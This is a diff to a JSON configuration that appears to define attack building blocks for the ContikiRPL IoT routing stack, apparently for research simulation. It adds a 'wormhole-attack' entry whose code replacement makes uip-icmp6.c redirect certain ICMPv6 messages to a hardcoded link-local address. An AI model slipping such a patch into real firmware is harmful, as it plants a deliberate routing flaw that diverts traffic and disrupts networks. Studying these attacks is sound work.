@@ -35,5 +35,10 @@ Building blocks consist of either ContikiRPL configuration constants or single-l
       ["#define INFINITE_RANK                   0xffff", "#define INFINITE_RANK 256"]
     ],
     "rpl-timers.c": ["rpl_recalculate_ranks();", null]
+  },
+  "wormhole-attack": {
+    "../ipv6/uip-icmp6.c": [
+      ["memcpy(&UIP_IP_BUF->destipaddr, dest, sizeof(*dest));", "uip_ipaddr_t *tempaddr;\ntempaddr = dest;\nuip_ipaddr_t inital_ip_struct;\nif( code == 2 ){\n\tuip_ip6addr(&inital_ip_struct, 0xfe80,0,0,0,0xc30c,0,0,0x0015);\n\ttempaddr = &inital_ip_struct;\n}\nmemcpy(&UIP_IP_BUF->destipaddr, tempaddr, sizeof(*tempaddr));"]
+    ]
   }
 }
